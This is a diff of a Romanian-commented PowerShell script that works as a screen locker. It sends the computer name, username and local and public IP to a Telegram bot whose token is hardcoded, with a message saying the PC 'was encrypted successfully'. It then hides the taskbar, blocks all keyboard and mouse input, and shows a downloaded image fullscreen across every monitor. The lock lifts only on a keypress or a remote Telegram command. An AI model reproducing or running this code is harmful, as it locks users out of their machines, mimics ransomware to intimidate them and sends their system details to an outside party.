@@ -15,37 +15,38 @@ public class Native {
 }
 "@
 
-# ▶️ INFO TELEGRAM
+# ▶️ VARIABILE SISTEM
 $pc = $env:COMPUTERNAME
 $user = $env:USERNAME
+$chatID = '656189986'
+$botToken = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'
 
-# Ia IP-ul local (ignora 127.x sau fe80:)
-$ip = (Get-NetIPAddress -AddressFamily IPv4 `
-    | Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress
+# IP local
+$ipLocal = (Get-NetIPAddress -AddressFamily IPv4 |
+    Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress
 
-$message = "PC-ul $pc + $user din amanet este protejat.`nAcesta este IP-ul PC-ului: $ip"
+# IP public
+try { $ipPublic = (Invoke-RestMethod -Uri "https://api.ipify.org") -as [string] } catch { $ipPublic = "n/a" }
 
-# Trimite în Telegram
-$uri = 'https://api.telegram.org/bot7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co/sendMessage'
+# ▶️ TRIMITE MESAJ TELEGRAM
+$message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic"
+$uriSend = "https://api.telegram.org/bot$botToken/sendMessage"
 $body = @{
-    'chat_id' = '656189986'
-    'text'    = $message
+    chat_id = $chatID
+    text    = $message
 } | ConvertTo-Json -Compress
+try { Invoke-RestMethod -Uri $uriSend -Method POST -Body $body -ContentType 'application/json' } catch {}
 
-try {
-    Invoke-RestMethod -Uri $uri -Method POST -Body $body -ContentType 'application/json'
-} catch {}
-
-# ▶️ Ascunde Taskbar și blochează input
+# ▶️ ASCUNDE TASKBAR ȘI BLOCHEAZĂ INPUT
 $taskbar = [Native]::FindWindow("Shell_TrayWnd", "")
 [Native]::ShowWindow($taskbar, 0)
 [Native]::BlockInput($true)
 
-# ▶️ Descarcă imaginea
+# ▶️ DESCARCĂ IMAGINEA
 $temp = "$env:TEMP\poza_laptop.jpg"
 Invoke-WebRequest "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $temp -UseBasicParsing
 
-# ▶️ Calculează rezoluția tuturor monitoarelor
+# ▶️ CALCULARE MONITOARE
 $bounds = [System.Windows.Forms.Screen]::AllScreens | ForEach-Object { $_.Bounds }
 $minX = ($bounds | ForEach-Object { $_.X }) | Measure-Object -Minimum | Select-Object -ExpandProperty Minimum
 $minY = ($bounds | ForEach-Object { $_.Y }) | Measure-Object -Minimum | Select-Object -ExpandProperty Minimum
@@ -54,10 +55,18 @@ $maxBottom = ($bounds | ForEach-Object { $_.Bottom }) | Measure-Object -Maximum 
 $width = $maxRight - $minX
 $height = $maxBottom - $minY
 
-# ▶️ Variabilă de control
+# ▶️ VARIABILĂ DE CONTROL
 $script:inchis = $false
 
-# ▶️ Creează fereastra mare
+# ▶️ FUNCȚIE DE ÎNCHIDERE
+function InchideTot {
+    $script:inchis = $true
+    [Native]::BlockInput($false)
+    [Native]::ShowWindow($taskbar, 1)
+    $form.Close()
+}
+
+# ▶️ CREARE FEREASTRĂ
 $form = New-Object Windows.Forms.Form
 $form.StartPosition = 'Manual'
 $form.Location = New-Object Drawing.Point $minX, $minY
@@ -76,22 +85,35 @@ $pb.Dock = 'Fill'
 $pb.SizeMode = 'Zoom'
 $form.Controls.Add($pb)
 
-# ▶️ Închide la C
+# ▶️ Închide cu tasta C
 $form.Add_KeyDown({
-    if ($_.KeyCode -eq 'C') {
-        $script:inchis = $true
-        $form.Close()
-    }
+    if ($_.KeyCode -eq 'C') { InchideTot }
 })
+$form.Add_FormClosing({ if (-not $script:inchis) { $_.Cancel = $true } })
 
-$form.Add_FormClosing({
-    if (-not $script:inchis) { $_.Cancel = $true }
-})
-
-# ▶️ Rulează aplicația
+# ▶️ Afișează formularul
 $form.Show()
-[System.Windows.Forms.Application]::Run($form)
 
-# ▶️ Deblochează după închidere
-[Native]::BlockInput($false)
-[Native]::ShowWindow($taskbar, 1)
+# ▶️ PORNEȘTE MONITORIZARE TELEGRAM
+Start-Job -ScriptBlock {
+    $target1 = "👍 $env:USERNAME"
+    $target2 = "👍 $env:COMPUTERNAME"
+    $updatesUrl = "https://api.telegram.org/bot$using:botToken/getUpdates"
+
+    while (-not $using:script:inchis) {
+        try {
+            $updates = Invoke-RestMethod -Uri $updatesUrl -Method GET -TimeoutSec 5
+            foreach ($update in $updates.result) {
+                $txt = $update.message.text
+                if ($txt -eq $target1 -or $txt -eq $target2) {
+                    Start-Sleep -Milliseconds 500
+                    [System.Windows.Forms.Application]::OpenForms[0].Invoke([Action]{ $using:InchideTot.Invoke() })
+                }
+            }
+        } catch {}
+        Start-Sleep -Seconds 5
+    }
+}
+
+# ▶️ RUN LOOP
+[System.Windows.Forms.Application]::Run($form)
